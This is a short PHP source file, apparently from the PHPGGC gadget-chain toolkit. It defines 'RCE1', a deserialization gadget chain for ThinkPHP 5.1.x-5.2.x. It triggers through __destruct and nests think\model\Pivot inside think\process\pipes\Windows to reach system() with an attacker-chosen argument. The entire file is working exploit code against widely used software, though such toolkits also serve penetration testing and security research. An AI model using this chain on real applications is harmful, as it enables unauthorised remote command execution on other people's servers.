<?php

namespace GadgetChain\ThinkPHP;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.1.x-5.2.x';
    public static $vector = '__destruct';
    public static $author = 'Smi1e';
    public static $information = '
        This chain can only execute system().
        Because the second parameter is uncontrollable
    ';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];
        $Conver = new \think\model\Pivot($parameter);
        return new \think\process\pipes\Windows($Conver);
    }
}